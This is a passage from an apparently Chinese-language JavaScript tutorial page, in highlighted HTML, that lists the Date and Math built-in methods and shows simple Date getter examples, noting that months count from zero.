class="title">getUTCFullYear</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">getUTCHours</span>: <span class="function"><span class="keyword">function</span> <span class="title">getUTCHours</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">getUTCMilliseconds</span>: <span class="function"><span class="keyword">function</span> <span class="title">getUTCMilliseconds</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">getUTCMinutes</span>: <span class="function"><span class="keyword">function</span> <span class="title">getUTCMinutes</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">getUTCMonth</span>: <span class="function"><span class="keyword">function</span> <span class="title">getUTCMonth</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">getUTCSeconds</span>: <span class="function"><span class="keyword">function</span> <span class="title">getUTCSeconds</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">getYear</span>: <span class="function"><span class="keyword">function</span> <span class="title">getYear</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">setDate</span>: <span class="function"><span class="keyword">function</span> <span class="title">setDate</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">setFullYear</span>: ƒ <span class="title">setFullYear</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">setHours</span>: ƒ <span class="title">setHours</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">setMilliseconds</span>: ƒ <span class="title">setMilliseconds</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">setMinutes</span>: ƒ <span class="title">setMinutes</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">setMonth</span>: ƒ <span class="title">setMonth</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">setSeconds</span>: ƒ <span class="title">setSeconds</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">setTime</span>: ƒ <span class="title">setTime</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">setUTCDate</span>: ƒ <span class="title">setUTCDate</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">setUTCFullYear</span>: ƒ <span class="title">setUTCFullYear</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">setUTCHours</span>: ƒ <span class="title">setUTCHours</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">setUTCMilliseconds</span>: ƒ <span class="title">setUTCMilliseconds</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">setUTCMinutes</span>: ƒ <span class="title">setUTCMinutes</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">setUTCMonth</span>: ƒ <span class="title">setUTCMonth</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">setUTCSeconds</span>: ƒ <span class="title">setUTCSeconds</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">setYear</span>: ƒ <span class="title">setYear</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">toDateString</span>: ƒ <span class="title">toDateString</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">toGMTString</span>: ƒ <span class="title">toUTCString</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">toISOString</span>: ƒ <span class="title">toISOString</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">toJSON</span>: ƒ <span class="title">toJSON</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">toLocaleDateString</span>: ƒ <span class="title">toLocaleDateString</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">toLocaleString</span>: ƒ <span class="title">toLocaleString</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">toLocaleTimeString</span>: ƒ <span class="title">toLocaleTimeString</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">toString</span>: ƒ <span class="title">toString</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">toTimeString</span>: ƒ <span class="title">toTimeString</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">toUTCString</span>: ƒ <span class="title">toUTCString</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">valueOf</span>: ƒ <span class="title">valueOf</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">Symbol</span>(<span class="params"><span class="built_in">Symbol</span>.toPrimitive</span>): ƒ [<span class="title">Symbol</span>.<span class="title">toPrimitive</span>](<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">__proto__</span>: <span class="title">Object</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br></pre></td></tr></table></figure><p>使用Date实例化的对象可以有这些方法，太多了我就介绍几个常用的，只需要注意月份从0开始就行了</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> now = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">now; <span class="comment">// Date Mon May 25 2020 09:12:00 GMT+0800 (中国标准时间)</span></span><br><span class="line">now.getFullYear(); <span class="comment">// 2020, 年份</span></span><br><span class="line">now.getMonth(); <span class="comment">// 4, 月份，注意月份范围是0~11，4表示5月</span></span><br><span class="line">now.getDate(); <span class="comment">// 25</span></span><br><span class="line">now.getDay(); <span class="comment">// 1, 表示星期一</span></span><br><span class="line">now.getHours(); <span class="comment">// 9, 24小时制</span></span><br><span class="line">now.getMinutes(); <span class="comment">// 12, 分钟</span></span><br><span class="line">now.getSeconds(); <span class="comment">// 0, 秒，我这时间卡得准不准哈哈</span></span><br><span class="line">now.getMilliseconds(); <span class="comment">// 875, 毫秒数</span></span><br><span class="line">now.getTime(); <span class="comment">// 1590370516029, 以number形式表示的时间戳</span></span><br></pre></td></tr></table></figure><blockquote><p>Date()可以接受毫秒数和时间参数，都可以以本地时间格式显示出来</p></blockquote><h3 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h3><figure class="highlight js"><figcaption><span>Math &gt;folded</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Math</span></span><br><span class="line">    <span class="attr">E</span>: <span class="number">2.718281828459045</span></span><br><span class="line">    <span class="attr">LN10</span>: <span class="number">2.302585092994046</span></span><br><span class="line">    <span class="attr">LN2</span>: <span class="number">0.6931471805599453</span></span><br><span class="line">    <span class="attr">LOG10E</span>: <span class="number">0.4342944819032518</span></span><br><span class="line">    <span class="attr">LOG2E</span>: <span class="number">1.4426950408889634</span></span><br><span class="line">    <span class="attr">PI</span>: <span class="number">3.141592653589793</span></span><br><span class="line">    <span class="attr">SQRT1_2</span>: <span class="number">0.7071067811865476</span></span><br><span class="line">    <span class="attr">SQRT2</span>: <span class="number">1.4142135623730951</span></span><br><span class="line">    <span class="attr">abs</span>: <span class="function"><span class="keyword">function</span> <span class="title">abs</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    <span class="title">acos</span>: <span class="function"><span class="keyword">function</span> <span class="title">acos</span>(<span class="params"></span>)</span></span></span><br><span class="line"><span class="function"><span class="function">    <span class="title">acosh</span>: <span class="function"><span class="keyword">function</span> <span class="title">acosh</span>(<span class="params"></span>)</span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function">    <span class="title">asin</span>: <span class="function"><span class="keyword">function</span> <span class="title">asin</span>(<span class="params"></span>)</span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">asinh</span>: <span class="function"><span class="keyword">function</span> <span class="title">asinh</span>(<span class="params"></span>)</span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">atan</span>: <span class="function"><span class="keyword">function</span> <span class="title">atan</span>(<span class="params"></span>)</span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">atan2</span>: <span class="function"><span class="keyword">function</span> <span class="title">atan2</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">atanh</span>: <span class="function"><span class="keyword">function</span> <span class="title">atanh</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">cbrt</span>: <span class="function"><span class="keyword">function</span> <span class="title">cbrt</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">ceil</span>: <span class="function"><span class="keyword">function</span> <span class="title">ceil</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">clz32</span>: <span class="function"><span class="keyword">function</span> <span class="title">clz32</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">cos</span>: <span class="function"><span class="keyword">function</span> <span class="title">cos</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">cosh</span>: <span class="function"><span class="keyword">function</span> <span class="title">cosh</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">exp</span>: <span class="function"><span class="keyword">function</span> <span class="title">exp</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">expm1</span>: <span class="function"><span class="keyword">function</span> <span class="title">expm1</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">floor</span>: <span class="function"><span class="keyword">function</span> <span class="title">floor</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">fround</span>: <span class="function"><span class="keyword">function</span> <span class="title">fround</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">hypot</span>: <span class="function"><span class="keyword">function</span> <span class="title">hypot</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">imul</span>: <span class="function"><span class="keyword">function</span> <span class="title">imul</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">log</span>: <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">log10</span>: <span class="function"><span class="keyword">function</span> <span class="title">log10</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">log1p</span>: <span class="function"><span class="keyword">function</span> <span class="title">log1p</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">log2</span>: <span class="function"><span class="keyword">function</span> <span class="title">log2</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">max</span>: <span class="function"><span class="keyword">function</span> <span class="title">max</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">min</span>: <span class="function"><span class="keyword">function</span> <span class="title">min</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">pow</span>: <span class="function"><span class="keyword">function</span> <span class="title">pow</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">random</span>: <span class="function"><span class="keyword">function</span> <span class="title">random</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">round</span>: <span class="function"><span class="keyword">function</span> <span class="title">round</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">sign</span>: <span class="function"><span class="keyword">function</span> <span class="title">sign</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function"><span class="function">    <span class="title">sin</span>: <span class="function"><span class="keyword">function</span> <span class="title">sin</span>(<span class="params"></span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span 